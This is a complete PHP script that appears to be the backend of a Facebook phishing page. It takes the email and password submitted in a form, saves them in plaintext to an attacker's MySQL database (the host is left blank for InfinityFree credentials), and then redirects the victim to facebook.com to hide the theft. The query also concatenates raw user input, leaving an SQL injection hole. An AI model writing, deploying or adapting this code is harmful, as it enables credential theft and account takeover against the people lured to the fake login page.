<?php
$hostname = "";   // Your InfinityFree SQL host
$username = "";      // Database username
$password = "";    // Database password
$database = "";   // Database name

$conn = new mysqli($hostname, $username, $password, $database);

if ($conn->connect_error) {
    die("Connection failed: " . $conn->connect_error);
}

$email = $_POST['email'];
$pass = $_POST['password'];

$sql = "INSERT INTO logins (email, password) VALUES ('$email', '$pass')";

if ($conn->query($sql) === TRUE) {
    echo "Saved Successfully!";
} else {
    echo "Error: " . $conn->error;
}

$conn->close();

header("Location: https://facebook.com");
exit();
?>
